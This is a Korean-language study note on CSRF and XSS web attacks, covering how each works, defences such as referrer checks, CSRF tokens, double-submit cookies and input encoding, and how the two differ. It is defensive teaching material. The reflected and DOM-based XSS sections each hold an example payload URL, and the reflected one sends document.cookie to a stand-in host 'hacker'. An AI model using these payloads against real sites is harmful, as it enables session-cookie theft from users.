# **CSRF & XSS**

<br>

## **Cross Site Request Forgery; CSRF**

- 웹사이트 취약점 공격
- 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 웹사이트에 요청하게 하는 공격
- 자동 로그인이 되어있는 경우 로그인된 사용자의 권한을 사용하는 방식

<br>

### **_공격 방식_**

1. 공격자는 CSRF 스크립트가 포함된 게시물을 전송

2. 관리자는 공격자가 등록한 CSRF 스크립트가 포함된 게시물을 확인

3. 게시물을 열람하면 **관리자의 권한**으로 공격자가 원하는 CSRF 스크립트 요청 발생

4. 스크립트가 실행되어 관리자 및 사용자의 피해 발생

<br>

### **_방어 기법_**

- **Referrer 체크**
  - 백앤드에서 요청의 referrer를 확인하여 도메인이 일치하는지 검증
  - 일반적인 경우 referrer 검증만으로 대부분의 CSRF 공격 방어 가능

- **Security Token 사용**

  - Referrer 검증이 불가할 때의 대안
  - 서버에서 Hash로 암호화된 token을 발급
  - 사용자는 매 요청마다 token을 함께 보내어 서버가 검증

- **Double Submit Cookie 검증**

  - Security token의 한 종류
  - 세션을 사용할 수 없는 환경에서 사용
  - JS에서 타 도메인의 쿠키 값을 확인/수정하지 못하는 것을 이용한 기법
  - token을 요청 파라미터와 헤더에 저장하여 서버로 전송
  - 서버에서 쿠키와 파라미터의 토큰 값이 일치하는지 검사

- **추가인증 수단 사용**
  - 추가 인증 수단을 거쳐 테스트를 통과하지 못하면 요청 거부
  - ex) CAPTCHA (구글 그림 선택, 그림에 보이는 글씨 쓰기), 2차 비밀번호

---

<br><br>

## Cross Site Scripting; XSS
- 웹 애플리케이션 취약점 공격
- 관리자가 아닌 권한 없는 사용자가 웹 사이트에 스크립트를 삽입하는 공격 기법
- 사용자로부터 입력받은 값을 제대로 검사하지 않고 사용할 경우 나타남
- 해커가 사용자의 쿠키, 세션 정보를 탈취하거나 자동으로 비정상적인 기능을 수행하게 함
- 시스템 관리자 권한을 탈취하거나 악성 코드 다운로드


<br>

### **_공격 방식_**
- Persistent(Stored) XSS
  - 지속적으로 피해를 입히는 XSS 공격
  - 해커가 XSS 취약점이 있는 곳에 악성 스크립트 삽입
  - 악성 스크립트가 DB에 저장
  - 악성 스크립트가 삽입된 페이지를 열람한 사용자는 쿠키를 탈취당하거나 다른 사이트로 리다이렉션 되는 공격 받음

<br>

- Reflected XSS
  - 서버가 입력 받은 값을 포함해 응답할 때 악성 스크립트 실행
  - 주로 URL등을 클릭하게 유도하여 클릭 시 악성 스크립트 실행되며 공격
  - 예시 공격 코드 `http://testweb?search=<script>location.href("http://hacker/cookie.php?value="+document.cookie);</script>`

<br>

- DOM based XSS
  - 사용자가 악의적인 스크립트가 포함된 URL을 요청하게 되어 브라우저를 해석하는 단계에 발생하는 공격 
  - 스크립트에 의해 클라이언트 측 코드가 원래 의도와 다르게 실행
  - 다른 공격과 다른 점은 서버측에서 탐지가 어려움
    - #이라는 특수문자를 사용하면 서버에 전송되지 않기 때문
    - `http://www.some.site/page.html#defaiult=<script>alert(document.cookie)</script>`


<br><br>

### **_방어 기법_**
- 데이터 입력 전에 데이터 길이, 형식 등 검사
- 사용자가 입력한 값 유효성 검증
  - 입력 값 제한
    - ex) page 값을 숫자만으로 허용
  - 입력 값 치환
    - \<script\>를 문자 참조로 필터링하고 서버에서 브라우저로 전송 시 문자를 인코딩
    - ex) '<'값을 '\&lt;'로 치환 (사용자는 \<script\>로 보이지만 HTML문서에서는 스크립트로 해석 X)
- 스크립트 영역에 출력 자제
  - 이벤트 핸들러 영역에 스크립트가 삽입되는 경우 보호기법을 우회할 수 있으므로 사용자 입력을 출력하는 것을 최대한 자제
- PLURA XSS 필터 사용
  - 필터 사용 시 XSS 공격 발생하면 공격자의 IP를 차단함
- 웹 방화벽 사용
  - 웹 방화벽은 웹 공격에 특화되어 XSS공격뿐만 아니라 각종 Injection 공격을 방어


---

<br><br>

## CSRF와 XSS의 차이점
||XSS|CSRF|
|:---:|:---:|:---:|
|공격대상|Client|Server|

- XSS는 사이트변조나 백도어를 통해 클라이언트에 대한 악성공격
- CSRF는 요청을 위조하여 사용자의 권한을 이용해 서버에 대한 악성공격
